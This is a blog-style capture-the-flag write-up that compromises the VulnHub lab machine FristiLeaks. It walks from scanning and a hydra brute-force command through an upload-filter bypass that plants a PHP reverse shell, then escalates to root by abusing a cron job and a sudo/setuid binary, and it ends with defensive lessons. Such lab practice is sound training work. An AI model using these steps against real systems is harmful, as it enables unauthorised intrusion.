---
title: "Gaining access to FristiLeaks (VulnHub)"
date: 2020-05-01
tags: [offensive security, vulnhub, gaining access]
header:
  image: "/images/banner2.png"
  excerpt: "Offensive security, VulnHub, Gaining access"
---

I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.69.0/16   |   Screen View: Unique Hosts                                                                                                          

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                                                                             
 192.168.56.100  08:00:27:a6:d5:8c      1      60  PCS Systemtechnik GmbH                                                                                                     
 192.168.56.113  08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH                                                                                              
```

I then ran an nmap scan against the target's IP address `192.168.56.113` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because don’t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -oA fristileaks 192.168.56.113
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 08:58 EDT
Nmap scan report for 192.168.56.113
Host is up (0.00082s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site does not have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.56.113

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.89 seconds
```

This was definitely a web based challenge, so after not finding any useful exploits for the Apache version (as expected) I visited the target's website. Nothing interesting on the front page (or in its source), so I gave the three disallowed paths from the `nmap` output a try. Nothing there either, except 'hints' that these weren't the pages I'm looking for. I decided to run `dirb` in order to find other pages/paths that might be useful:

```bash
kali@kali:~$ dirb http://192.168.56.113

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May  2 10:12:05 2020
URL_BASE: http://192.168.56.113/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.113/ ----
+ http://192.168.56.113/cgi-bin/ (CODE:403|SIZE:210)                                                                                                                          
==> DIRECTORY: http://192.168.56.113/images/                                                                                                                                  
+ http://192.168.56.113/index.html (CODE:200|SIZE:703)                                                                                                                        
+ http://192.168.56.113/robots.txt (CODE:200|SIZE:62)                                                                                                                         

---- Entering directory: http://192.168.56.113/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat May  2 10:12:10 2020
DOWNLOADED: 4612 - FOUND: 3
```

Nothing. Even `nikto` didn't report anything useful:

```bash
kali@kali:~$ nikto -h 192.168.56.113
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.113
+ Target Hostname:    192.168.56.113
+ Target Port:        80
+ Start Time:         2020-05-02 10:13:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8727 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-05-02 10:13:24 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

After a lot of thinking and staring at the output I had so far, I grew more and more convinced that there had to be a path that I was missing. After all, `dirb` only scans for paths based on the wordlist you give it. In this case, I used the default wordlist which returned no matches. I tried again with a few different wordlists, but still no success. The only conclusion I could come up with is that I'd have to manually try some pathnames based on the information the website was already giving me. As simple as things can be sometimes, `fristi` was what I was looking for:

![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_login.png)

The username and password fields did not seem SQL injectable at first sight, so I took a look at the page source. Some notes were left here about the way the website stores images by `base64` encoding them. I noticed the `base64` encoding of a second image (?) although the page only displayed one image. I went ahead and decoded that and got the following:

```bash
kali@kali:~$ nano b64.txt
kali@kali:~$ man base64
kali@kali:~$ base64 -d b64.txt
�PNG
▒
IHDRm4�A�sRGB���gAMA��                                                                                                                                                         
                      �a        pHYs���o�dRIDATx^��Qv� �a��                                                                                                                    
                                                           �z��l&�I%KH�@f45�5��VI                                                                                              
                                                                                 ���s��~���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/�����&������T3h��#3՗j�              
                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW$�o��y���{K}�f�P����9{�6�X��KKL>����a�%�ZD�                                                                                                                        
'��*�%&��Rxg�յ���V3]��#q�pz�R�\Zb�      -]�յ���JH5�9r(����I5se��G�tXq"k�6���j�����e׵�K����Z�t1n��               ���6��                                                         
F��n�T3W��ג���ߞ���j�                                                          �g=�Yx�i�bѢꍗj�ʒ�H-Y��ʯ��JH5Ӆx�D7(
                    ��ߠ�MI6�������D3�
                                     ������M���JH5ӅZ�l3�GY�d��M▒o6��T�rR�
                                                                         ��/�-��5ӅJ��I,�i9�l�Ѣ��Y��D���![

�o����͹tWK}�f�h�����}d� [��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�\g}<���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��'c�jƸdЖJ{<7
����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��>��U騢"�3�jƼdȖ�ˆ#۞�����j��)'�zUq��F>L�Z���[Z4���LZ�R}�f�ˑ����S;���|�������f.-������h��FEZ�T_��>�sd�a6�(.�U^n|/�����ZZ��=�#;t����T_��>Trd��+?���8�7�j-�}d��R�t!�#�[/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E�����Z�8�rqIEND�B`�
```

Given that the notes from earlier mentioned how this way of encoding is used for images and the output above starts with `�PNG
`, I `piped` the output to a new file which I gave the `.png` extension. Opening that file showed the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_decodedpic.png)

This seemed like it could work as a password in the login form I found earlier. Now I only had to find the username, which turned out harder than I thought.

I tried the usual ones like `admin`, `root`, `user`, etc. but no luck. I then even ran a bruteforce attempt on the login form using `hydra -L usernames.txt -p keKkeKKeKKeKkEkkEk 192.168.56.113 http-post-form '/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^:S=Wrong' -w 5 -W 1 -vV` but no matches found. This lead me to believe that the info I needed, again, would be hidden in plain sight somewhere. I took another look at the login form's page source and I noticed the name `eezeepz`. I gave that a try and sure enough, I was in:

![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_loggedin.png)

Since this gave me access to some kind of file upload application, I decided to upload a reverse PHP shell and then run it by visiting it via whatever path it would be uploaded to. The file upload application seemed to be whitelisting file extensions, which didn't allow filenames ending in `.php` to be uploaded. This just meant I had to rename the reverse PHP shell to something ending in `.png`. I set up a listener on my Kali machine and then uploaded and opened the file via `192.168.56.113/uploads/php-reverse-shell.php.png`.

Strangely enough this didn't work, despite the message I got telling me the upload was successful and should be found at `/uploads/`. Eventually I found out that on some websites, you can add `GIF89a;` to the header of your file to circumvent extra file checks being done. I did this and my listener finally caught a low privilege shell on the target's system:

```sh
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...                                                                                                                                                    
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.113] 53521                                                                                                              
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux                                                       
 14:58:08 up 14 min,  0 users,  load average: 0.00, 0.00, 0.00                                                                                                                 
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                           
uid=48(apache) gid=48(apache) groups=48(apache)                                                                                                                                
sh: no job control in this shell
sh-4.1$ whoami
whoami
apache
```

I moved on to see how I could turn my limited privileges into full privileges. Looking around I found some `.txt` files with notes:

```sh
sh-4.1$ ls ~
ls ~
cgi-bin  error  html  icons  notes.txt
sh-4.1$ cat ~/notes.txt
cat ~/notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
sh-4.1$ ls /home/eezeepz
ls /home/eezeepz
MAKEDEV    chown        hostname  netreport       taskset     weak-modules
cbq        clock        hwclock   netstat         tc          wipefs
cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk     cpio         kill      nice            touch       ypdomainname
chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
chgrp      ctrlaltdel   kpartx    nologin         tracepath6  zic
chkconfig  cut          nameif    notes.txt       true
chmod      halt         nano      tar             tune2fs
sh-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Do not forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```

I tried giving myself read, write and execute rights to the `/etc/sudoers` file by executing `echo "/home/admin/chmod 777 /etc/sudoers" > /tmp/runthis` but this didn't work. Whoever designed this machine probably had something more specific in mind so I gave myself full access to the `/home/admin` directory instead:

```sh
sh-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
sh-4.1$ ls -al /home
ls -al /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 May  2 14:43 ..
drwx------.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
sh-4.1$ ls -al /home
ls -al /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 May  2 14:43 ..
drwx------.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
sh-4.1$ ls -al /home
ls -al /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 May  2 14:43 ..
drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
sh-4.1$ ls /home/admin
ls /home/admin
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps
sh-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
cat: whoisyourgodnow.txt: No such file or directory
sh-4.1$ cd /home/admin
cd /home/admin
sh-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
sh-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
sh-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

This was going somewhere. All I would have to do was reverse the encrypted password (`=RFn0AKnlMHMPIzpyuTI0ITG`) to the original plaintext password by following the steps of `cryptpass.py` in reverse order. This meant 1) using the ROT13 cipher on it (ROT13 forward does the same as ROT13 backwards), 2) spelling the result of that in reverse (that's what `[::-1]` does) and 3) running `base64 -d` on the result of that. The outcome: `LetThereBeFristi!`.

Because I remembered the `/home/fristigod` directory from earlier (and the name of the `.txt` file being `whoisyourgodnow.txt`), I checked if i could `sudo fristigod` with that password and sure enough:

```sh
sh-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
```

Still no root privileges, but at this point I had to be close. Turned out that I was:

```sh
bash-4.1$ sudo -l
sudo -l
Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
bash-4.1$ sudo /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom' as root on localhost.localdomain.
bash-4.1$ cd /var/fristigod
cd /var/fristigod
bash-4.1$ ls -al
ls -al
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
bash-4.1$ cd .secret_admin_stuff
cd .secret_admin_stuff
bash-4.1$ ls
ls
doCom
bash-4.1$ file doCom
file doCom
doCom: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
bash-4.1$ ./doCom
./doCom
Nice try, but wrong user ;)
bash-4.1$ sudo -u fristi ./doCom
sudo -u fristi ./doCom
[sudo] password for fristigod: LetThereBeFristi!
Usage: ./program_name terminal_command ...
bash-4.1$ whoami
whoami
fristigod
bash-4.1$ sudo -u fristi ./doCom /bin/bash
sudo -u fristi ./doCom /bin/bash
bash-4.1# whoami
whoami
root
```

## Lessons learned

This machine had a lot more CTF-like features than the other ones I've done so far. This means the lessons that can be learned from this (to prevent similar situations from happening in the future) may be obvious to some readers. I will still mention them however, just in a more concise format due to the amount and nature of the steps taken to gain full access:

* Don't store credentials in places where the location doesn't serve any direct purpose or is publically viewable (such as in a website's page source)
* Don't use base64 encoding, ROT13 ciphers or reverse ciphers for your passwords as an alternative to strong hashing and encryption algorithms, salting, etc.
* Ideally, don't even store/mention usernames in places where doing so serves no function (and consider using something like an alias instead) - this makes bruteforcing a lot less viable as well, even when that didn't work in this particular situation
* Don't openly store important code (such as code that clearly shows how password strings are stored)
* Think twice about why, how and for who SUID executables should be created, given how often these are exploited to gain full access of a target machine
